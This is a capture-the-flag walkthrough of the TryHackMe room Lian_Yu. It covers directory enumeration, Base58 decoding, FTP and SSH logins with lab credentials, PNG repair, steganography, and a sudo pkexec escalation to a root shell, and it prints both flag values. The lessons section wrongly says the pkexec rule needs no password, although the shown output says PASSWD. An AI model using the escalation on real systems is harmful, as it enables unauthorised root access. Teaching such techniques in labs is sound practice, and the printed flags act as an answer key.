---
title: "Lian_Yu"
description: "A beginner-friendly boot2root room combining web directory enumeration, hidden source code hints, Base58 decoding, FTP access, PNG header repair, steganography, SSH, and a pkexec sudo misconfiguration for root."
difficulty: "Easy"
tags: ["FTP", "Steganography", "Base58", "Gobuster", "PNG Header", "SSH", "Pkexec", "Sudo"]
date: "2026-07-31"
---

## Overview

Lian_Yu is a beginner-level TryHackMe room themed around the Arrow TV series. The path to the flags is layered like an episode: a hidden word in page source, a numeric directory, an encoded token, an anonymous FTP foothold, a corrupted PNG that hides a password, steganography that hides an SSH password, and finally a `pkexec` sudo misconfiguration that hands over root.

## Room Information

- **Platform:** TryHackMe
- **Difficulty:** Easy
- **Skills Learned:** Web enumeration, source code analysis, Base58 decoding, FTP enumeration, PNG header repair, steganography, sudo privilege escalation

## Enumeration

### Nmap Scan

```bash
nmap -sV -sC -oN nmap.txt <target-ip>
```

![Nmap scan results](/assets/screenshots/lianyu/nmap.png)

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.2 |
| 22/tcp | SSH | OpenSSH 6.7p1 Debian 5+deb8u8 |
| 80/tcp | HTTP | Apache httpd |
| 111/tcp | rpcbind | 2-4 (RPC #100000) |

The web server hosts a page titled **"Purgatory"**, the name of the fictional island prison from the Arrowverse.

### Web Enumeration

![Homepage](/assets/screenshots/lianyu/homepage.png)

Directory enumeration with gobuster revealed a hidden directory:

```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![Island directory](/assets/screenshots/lianyu/island.png)

Viewing the source code of `/island` revealed a hidden code word written in white text on a white background:

![Island source code](/assets/screenshots/lianyu/island_source.png)

The hidden word `vigilante` looked like a potential username. Continuing to enumerate `/island`:

```bash
gobuster dir -u http://<target-ip>/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This found another directory: `/island/2100/`.

![2100 directory](/assets/screenshots/lianyu/2100.png)

The page itself contained an embedded YouTube video about Oliver Queen, but the source code held the real hint:

![2100 source code hint](/assets/screenshots/lianyu/2100_source.png)

```html
<!-- you can avail your .ticket here but how? -->
```

### Finding the Ticket

The comment hinted at a `.ticket` file. Gobuster can search by extension with the `-x` flag:

```bash
gobuster dir -u http://<target-ip>/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket
```

This found `green_arrow.ticket`:

![green_arrow.ticket](/assets/screenshots/lianyu/green_arrow.png)

The ticket contained a token:

```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

### Base58 Decoding

The string `RTy8yhBQdscX` was not Base64 (no padding characters) but decoded cleanly with CyberChef's **From Base58** recipe:

![CyberChef Base58 decode](/assets/screenshots/lianyu/cyberchef.png)

Decoded value: `!#th3h00d` — a password.

## Initial Access — FTP

The username `vigilante` and password `!#th3h00d` worked on the FTP service:

```bash
ftp <target-ip>
Name: vigilante
Password: !#th3h00d
```

![FTP login as vigilante](/assets/screenshots/lianyu/ftp_login.png)

The FTP root contained several interesting files:

- `aa.jpg` — a JPEG image
- `Leave_me_alone.png` — a corrupted PNG
- `Queen's_Gambit.png` — a valid PNG
- `.other_user` — a text file
- `.bash_history` — contained only the message "Sorry I couldn't Help Other user Might help"

The `.other_user` file was a biography of **Slade Wilson** — this is the Deathstroke character, suggesting the username `slade` exists on the box. Navigating up a directory confirmed this: FTP showed two users, `slade` and `vigilante`.

### Repairing the Corrupted PNG

`Leave_me_alone.png` would not open. Checking its header revealed the problem — the PNG magic bytes were wrong:

```
5845 6fae 0a0d 1a0a
```

A valid PNG must start with the signature `89 50 4E 47 0D 0A 1A 0A`. The header was repaired with `dd`:

```bash
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | dd conv=notrunc of=Leave_me_alone.png bs=1
```

The repaired image revealed the word **"password"**:

![Leave_me_alone.png reveals password](/assets/screenshots/lianyu/password_image.png)

### Steganography on aa.jpg

The password found in the repaired PNG was used with steghide against `aa.jpg`:

```bash
steghide extract -sf aa.jpg
Enter passphrase: password
```

![Steghide extraction](/assets/screenshots/lianyu/steghide.png)

This extracted `ss.zip`, which contained two files: `passwd.txt` (flavor text) and `shado`. The `shado` file contained the SSH password:

![shado file with M3tahuman](/assets/screenshots/lianyu/shado.png)

```bash
cat shado
M3tahuman
```

## SSH Access

```bash
ssh slade@<target-ip>
Password: M3tahuman
```

![SSH login as slade](/assets/screenshots/lianyu/ssh_login.png)

### User Flag

```bash
cat user.txt
```

**User flag:** `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}`

## Privilege Escalation

### Checking Sudo Privileges

```bash
sudo -l
```

![sudo -l output](/assets/screenshots/lianyu/sudo_l.png)

```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

The `slade` user can run `/usr/bin/pkexec` with root privileges. `pkexec` is part of Polkit and allows executing commands as another user. When sudo permits it, `pkexec` can be used to spawn a root shell.

### Root Shell

```bash
sudo /usr/bin/pkexec /bin/sh
```

![Root shell via pkexec](/assets/screenshots/lianyu/root_shell.png)

### Root Flag

```bash
cat /root/root.txt
```

**Root flag:** `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}`

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/slade/user.txt` | `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}` |
| Root | `/root/root.txt` | `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}` |

## Commands Used

```bash
# Enumeration
nmap -sV -sC -oN nmap.txt <target-ip>
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<target-ip>/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<target-ip>/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .ticket

# Base58 decode (CyberChef): RTy8yhBQdscX -> !#th3h00d

# FTP
ftp <target-ip>  # vigilante : !#th3h00d
mget *
cd ..  # reveal slade user

# Fix PNG header
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' | dd conv=notrunc of=Leave_me_alone.png bs=1

# Steganography
steghide extract -sf aa.jpg  # passphrase: password
unzip ss.zip
cat shado  # M3tahuman

# SSH
ssh slade@<target-ip>  # password: M3tahuman
cat /home/slade/user.txt

# Privilege escalation
sudo -l
sudo /usr/bin/pkexec /bin/sh
cat /root/root.txt
```

## Lessons Learned

- **Always view the source code.** The username `vigilante` was hidden in white text on a white background — invisible on the rendered page but present in the HTML.
- **Gobuster `-x` extends searches to files.** The hint in the source comment revealed the `.ticket` extension. Without the `-x .ticket` flag, the file would have been missed entirely.
- **Not all encodings are Base64.** The token `RTy8yhBQdscX` was Base58 — distinguishable by the absence of padding characters and visually ambiguous characters like `0`, `O`, `I`, and `l`. CyberChef's multi-encoding recipe helps identify unfamiliar formats.
- **File signatures matter.** The corrupted PNG was the result of a damaged magic header. Tools like `xxd` or `exiftool` can identify broken files, and repairing the header can reveal critical content.
- **Steganography tools are essential when images are present.** `steghide` with the extracted password revealed an embedded zip archive containing the SSH password. The pattern of "password in one file, use it on another" is common in CTFs.
- **Sudo misconfigurations are the fastest path to root.** A user allowed to run `pkexec` as root with no password effectively has root access. Always check `sudo -l` first during privilege escalation.
- **Enumeration is cumulative.** Every clue in this room (username in source, directory number, ticket, FTP files) built on the previous one. Thorough enumeration at each stage is what unlocks the next.

## References

- [TryHackMe — Lian_Yu](https://tryhackme.com/room/lianyu)
- [CyberChef — From Base58 Recipe](https://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true))
- [GTFOBins — pkexec](https://gtfobins.github.io/gtfobins/pkexec/)
- [Steghide — SourceForge](http://steghide.sourceforge.net/)
- [Paradoxis/StegCracker](https://github.com/Paradoxis/StegCracker)
- [PNG File Signature — Wikipedia](https://en.wikipedia.org/wiki/Portable_Network_Graphics)
- [Ubuntu Manpage — pkexec](http://manpages.ubuntu.com/manpages/trusty/man1/pkexec.1.html)
